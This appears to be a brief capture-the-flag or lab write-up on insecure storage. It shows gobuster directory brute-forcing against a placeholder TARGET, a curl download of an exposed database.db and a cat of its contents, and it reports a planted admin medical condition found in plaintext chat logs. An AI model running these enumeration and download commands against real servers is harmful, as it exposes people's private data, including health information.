# Excessive Data Handling and Insecure Storage

Database file exposed publicly via web server containing full chat history.

## Attack

```bash
gobuster dir -u http://TARGET/ -w raft-small-words.txt -x .db,.txt,.html
curl -O http://TARGET/database.db
cat database.db
```

Admin's medical condition found in plaintext chat logs: Cache Collapse Syndrome
